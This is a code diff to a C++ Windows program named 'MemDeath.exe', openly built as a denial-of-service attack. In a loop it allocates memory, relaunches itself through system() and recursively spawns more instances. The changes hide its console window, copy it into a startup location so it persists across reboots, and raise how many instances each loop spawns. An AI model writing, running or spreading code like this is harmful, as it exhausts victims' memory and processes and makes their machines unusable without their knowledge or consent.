@@ -4,12 +4,13 @@
 #include "Files.h"
 #define UNICODE 1
 using namespace std;
-int chararray = 107370900;
+string filename = "MemDeath.exe";
+int chararray = sizeof(int);
 string startcom;
 struct attack{
 
 	attack(int x){
-		new char[x];
+		char* ch = new char[x];
 		system(startcom.c_str());
 		new attack(chararray);
 		cout << "Initialized 1 with: " << this << endl;
@@ -28,7 +29,7 @@ struct attack{
 void attacking(string startCommand){
 	while(true){
 		try{
-			for(int i = 0; i < 10; i++){
+			for(int i = 0; i < 15; i++){
 				new attack(chararray);
 			}
 		}catch(exception e){
@@ -42,14 +43,13 @@ void attacking(string startCommand){
 	}
 }
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int cmdShow){
+	ShowWindow( GetConsoleWindow(), SW_HIDE );
 	char  szPath[MAX_PATH];
-	PSTR  lpFilename;
-	lpFilename = (strrchr(szPath, '\\') + 1);
-	beginStartup(szPath);
-	//ShowWindow( GetConsoleWindow(), SW_HIDE );
+	beginStartup(filename);
 	if (GetModuleFileName(NULL, szPath, sizeof szPath) == 0) return -1;
-	std::string startupPath = getStartupPath(szPath);
+	string startupPath = getStartupPath(filename);
 	startcom = "\""+startupPath+"\"";
+	cout << "startcom=" << startcom << endl;
 	attacking(startcom);
 	return 0;
 }
